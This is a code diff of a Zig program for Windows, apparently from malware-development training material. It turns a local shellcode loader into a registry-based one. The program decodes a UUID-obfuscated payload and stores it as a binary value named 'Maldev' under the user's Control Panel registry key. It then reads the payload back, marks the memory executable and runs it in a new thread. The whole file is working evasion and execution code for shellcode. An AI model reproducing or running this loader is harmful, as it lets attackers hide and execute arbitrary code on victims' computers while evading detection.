@@ -1,10 +1,12 @@
 const std = @import("std");
 const win = std.os.windows;
+const advapi32 = win.advapi32;
 const uuidDeobfuscation = @import("payload-obfuscation-uuidfuscation.zig").uuidDeobfuscation;
 
+const HANDLE = win.HANDLE;
 const WINAPI = win.WINAPI;
 const BOOL = win.BOOL;
-const HANDLE = win.HANDLE;
+const GetLastError = win.kernel32.GetLastError;
 
 const VIRTUAL_ALLOCATION_TYPE = packed struct(u32) {
     _0: u1 = 0,
@@ -83,6 +85,17 @@ extern "kernel32" fn VirtualAlloc(
     flProtect: PAGE_PROTECTION_FLAGS,
 ) callconv(WINAPI) ?*anyopaque;
 
+const VIRTUAL_FREE_TYPE = enum(u32) {
+    DECOMMIT = 16384,
+    RELEASE = 32768,
+};
+
+extern "kernel32" fn VirtualFree(
+    lpAddress: ?*anyopaque,
+    dwSize: usize,
+    dwFreeType: VIRTUAL_FREE_TYPE,
+) callconv(WINAPI) BOOL;
+
 extern "kernel32" fn VirtualProtect(
     lpAddress: ?*anyopaque,
     dwSize: usize,
@@ -144,21 +157,43 @@ extern "kernel32" fn CreateThread(
     lpThreadId: ?*u32,
 ) callconv(WINAPI) ?HANDLE;
 
-extern "kernel32" fn WaitForSingleObject(
-    hHandle: ?HANDLE,
-    dwMilliseconds: u32,
-) callconv(WINAPI) u32;
+const HKEY_CURRENT_USER = win.HKEY_CURRENT_USER;
+const KEY_SET_VALUE = win.KEY_SET_VALUE;
+const KEY_QUERY_VALUE = win.KEY_QUERY_VALUE;
+const HKEY = win.HKEY;
+const Win32Error = win.Win32Error;
+const RegOpenKeyExW = advapi32.RegOpenKeyExW;
+const RegCloseKey = advapi32.RegCloseKey;
+const RegGetValueW = advapi32.RegGetValueW;
+const RegQueryValueExW = advapi32.RegQueryValueExW;
+const RRF_RT_ANY = advapi32.RRF.RT_ANY;
 
-const VIRTUAL_FREE_TYPE = enum(u32) {
-    DECOMMIT = 16384,
-    RELEASE = 32768,
+const REG_VALUE_TYPE = enum(u32) {
+    NONE = 0,
+    SZ = 1,
+    EXPAND_SZ = 2,
+    BINARY = 3,
+    DWORD = 4,
+    DWORD_BIG_ENDIAN = 5,
+    LINK = 6,
+    MULTI_SZ = 7,
+    RESOURCE_LIST = 8,
+    FULL_RESOURCE_DESCRIPTOR = 9,
+    RESOURCE_REQUIREMENTS_LIST = 10,
+    QWORD = 11,
 };
 
-extern "kernel32" fn VirtualFree(
-    lpAddress: ?*anyopaque,
-    dwSize: usize,
-    dwFreeType: VIRTUAL_FREE_TYPE,
-) callconv(WINAPI) BOOL;
+extern "advapi32" fn RegSetValueExW(
+    hKey: ?HKEY,
+    lpValueName: ?[*:0]const u16,
+    Reserved: u32,
+    dwType: REG_VALUE_TYPE,
+    lpData: ?*const u8,
+    cbData: u32,
+) callconv(@import("std").os.windows.WINAPI) u32;
+
+const REGISTRY = std.unicode.utf8ToUtf16LeStringLiteral("Control Panel");
+const REG_STRING = std.unicode.utf8ToUtf16LeStringLiteral("Maldev");
 
 const uuid_array = [_][:0]const u8{
     "E48348FC-E8F0-00C0-0000-415141505251",
@@ -186,56 +221,128 @@ pub fn main() !void {
     defer _ = gpa.deinit();
     const allocator = gpa.allocator();
 
-    std.debug.print("[i] Injecting Shellcode To The Local Process Of Pid: {d}\n", .{win.GetCurrentProcessId()});
-
-    std.debug.print("[i] Decrypting ...\n", .{});
-
     const payload = try uuidDeobfuscation(allocator, &uuid_array);
     defer allocator.free(payload);
 
-    std.debug.print("[+] Done !\n", .{});
-    std.debug.print("[i] Deobfuscated Payload At: {*} Of Size: {d}\n", .{ payload, payload.len });
+    try writeShellcodeToRegistry(payload);
 
-    std.debug.print("[i] Allocating Memory With VirtualAlloc\n", .{});
+    const shellcode = try readShellcodeFromRegistry(allocator);
+    defer allocator.free(shellcode);
 
-    const shellcode = VirtualAlloc(null, payload.len, .{ .COMMIT = 1, .RESERVE = 1 }, .{ .PAGE_READWRITE = 1 }) orelse {
-        std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(win.kernel32.GetLastError())});
+    try runShellcode(shellcode);
+}
+
+fn writeShellcodeToRegistry(shellcode: []const u8) !void {
+    var h_key: HKEY = undefined;
+    if (RegOpenKeyExW(
+        HKEY_CURRENT_USER,
+        REGISTRY,
+        0,
+        KEY_SET_VALUE,
+        &h_key,
+    ) != 0) {
+        std.debug.print("[!] RegOpenKeyExW Failed\n", .{});
+        return error.RegOpenKeyExWFailed;
+    }
+    defer _ = RegCloseKey(h_key);
+
+    if (RegSetValueExW(
+        h_key,
+        REG_STRING,
+        0,
+        .BINARY,
+        @ptrCast(shellcode),
+        @intCast(shellcode.len),
+    ) != 0) {
+        std.debug.print("[!] RegSetValueExW Failed\n", .{});
+        return error.RegSetValueExWFailed;
+    }
+}
+
+fn readShellcodeFromRegistry(allocator: std.mem.Allocator) ![]u8 {
+    var h_key: HKEY = undefined;
+    if (RegOpenKeyExW(
+        HKEY_CURRENT_USER,
+        REGISTRY,
+        0,
+        KEY_QUERY_VALUE,
+        &h_key,
+    ) != 0) {
+        std.debug.print("[!] RegOpenKeyExW Failed\n", .{});
+        return error.RegOpenKeyExWFailed;
+    }
+    defer _ = RegCloseKey(h_key);
+
+    var shellcode_size: u32 = undefined;
+    if (RegQueryValueExW(
+        h_key,
+        REG_STRING,
+        null,
+        null,
+        null,
+        &shellcode_size,
+    ) != 0) {
+        std.debug.print("[!] RegQueryValueExW Failed\n", .{});
+        return error.RegQueryValueExWFailed;
+    }
+
+    const shellcode = try allocator.alloc(u8, shellcode_size);
+
+    var cb_data: u32 = undefined;
+    if (RegGetValueW(
+        HKEY_CURRENT_USER,
+        REGISTRY,
+        REG_STRING,
+        RRF_RT_ANY,
+        null,
+        shellcode.ptr,
+        &cb_data,
+    ) != 0) {
+        std.debug.print("[!] RegGetValueW Failed\n", .{});
+        return error.RegGetValueWFailed;
+    }
+
+    return shellcode;
+}
+
+fn runShellcode(shellcode: []u8) !void {
+    const shellcode_address = VirtualAlloc(
+        null,
+        shellcode.len,
+        .{ .COMMIT = 1, .RESERVE = 1 },
+        .{ .PAGE_READWRITE = 1 },
+    ) orelse {
+        std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(GetLastError())});
         return error.VirtualAllocFailed;
     };
+    defer _ = VirtualFree(shellcode_address, 0, .RELEASE);
 
-    defer _ = VirtualFree(shellcode, 0, .RELEASE);
-    std.debug.print("[i] Allocated Memory At: {*}\n", .{shellcode});
-
-    @memcpy(@as([*]u8, @ptrCast(shellcode)), payload);
-    @memset(payload, 0);
-
-    std.debug.print("[i] Modifying Memory Protection To EXECUTE_READWRITE ...\n", .{});
+    @memcpy(@as([*]u8, @ptrCast(shellcode_address)), shellcode);
+    @memset(shellcode, 0);
 
     var old_protection: PAGE_PROTECTION_FLAGS = undefined;
     if (VirtualProtect(
-        shellcode,
-        payload.len,
+        shellcode_address,
+        shellcode.len,
         .{ .PAGE_EXECUTE_READWRITE = 1 },
         &old_protection,
     ) == 0) {
-        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(win.kernel32.GetLastError())});
+        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(GetLastError())});
         return error.VirtualProtectFailed;
     }
-
-    const shellcode_fn: *const fn (lpThreadParameter: ?*anyopaque) callconv(WINAPI) u32 = @ptrCast(shellcode);
-
-    std.debug.print("[i] Creating A New Thread ...\n", .{});
 
     const h_thread = CreateThread(
         null,
         0,
-        shellcode_fn,
+        @ptrCast(shellcode_address),
         null,
         .{},
         null,
     ) orelse {
-        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(win.kernel32.GetLastError())});
+        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
         return error.CreateThreadFailed;
     };
-    _ = WaitForSingleObject(h_thread, 2000);
+    defer win.CloseHandle(h_thread);
+
+    try win.WaitForSingleObject(h_thread, win.INFINITE);
 }
